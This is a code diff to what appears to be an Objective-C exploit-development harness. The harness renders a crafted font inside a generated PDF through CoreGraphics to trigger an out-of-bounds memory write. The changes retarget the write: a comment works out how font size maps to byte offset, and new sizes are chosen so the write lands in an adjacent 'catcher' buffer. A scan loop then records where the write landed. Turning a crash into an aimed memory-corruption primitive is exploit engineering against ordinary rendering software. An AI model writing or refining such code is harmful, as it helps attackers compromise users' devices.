@@ -48,7 +48,7 @@ static void p072v5_fault(int sig) {
 #import <string.h>
 #import <unistd.h>
 
-#define P072_BUILD @"p072-86950-oob-harness-v5"
+#define P072_BUILD @"p072-86950-aimed-oob-v6"
 
 static void p072_dl(void (^L)(NSString *), const char *path) {
     void *h = dlopen(path, RTLD_LAZY);
@@ -683,8 +683,10 @@ static NSData *p072v3_build_pdf(NSData *ttf){
             if (!fv5) {
                 Lv(@"v5 [font] load FAIL");
             } else {
-                double v5sizes[] = { 17.0, 34.0, 100.0 };
-                for (int si = 0; si < 3; si++) {
+                /* dial law: byte offset = ~4*(1000*size + 20); catcher starts
+                   at +4 MB (canvas end) -> size ~1048+ lands inside catcher */
+                double v5sizes[] = { 17.0, 1048.0, 1200.0, 2000.0 };
+                for (int si = 0; si < 4; si++) {
                     Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] pre-render (guarded)",
                         v5sizes[si]]);
                     int sig = 0;
@@ -708,15 +710,21 @@ static NSData *p072v3_build_pdf(NSData *ttf){
                             CGContextFlush(c5);
                             CGContextRelease(c5);
                             p072v5_in = 0;
+                            /* scan the WHOLE block; classify canvas vs catcher */
                             long hits = 0; long first = -1; long last = -1;
-                            for (vm_size_t o = 0; o + 3 < CATCHBYTES; o += 4) {
-                                if (catcher[o]==0xFF && catcher[o+1]==0 && catcher[o+2]==0 && catcher[o+3]==0xFF) {
+                            long chit=0, cfirst=-1, clast=-1;
+                            for (vm_size_t o = 0; o + 3 < CVBYTES + CATCHBYTES; o += 4) {
+                                if (canvas[o]==0xFF && canvas[o+1]==0 && canvas[o+2]==0 && canvas[o+3]==0xFF) {
                                     if (first < 0) first = (long)o;
                                     last = (long)o; hits++;
+                                    if (o >= CVBYTES) {
+                                        if (cfirst < 0) cfirst = (long)(o - CVBYTES);
+                                        clast = (long)(o - CVBYTES); chit++;
+                                    }
                                 }
                             }
-                            Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] SURVIVED - catcher red-quad hits=%ld first=+0x%lx last=+0x%lx",
-                                v5sizes[si], hits, first, last]);
+                            Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] SURVIVED - all-block red-quad hits=%ld first=+0x%lx last=+0x%lx | catcher hits=%ld first=+0x%lx last=+0x%lx",
+                                v5sizes[si], hits, first, last, chit, cfirst, clast]);
                         } else {
                             p072v5_in = 0;
                             Lv(@"v5 [ctx] FAIL");
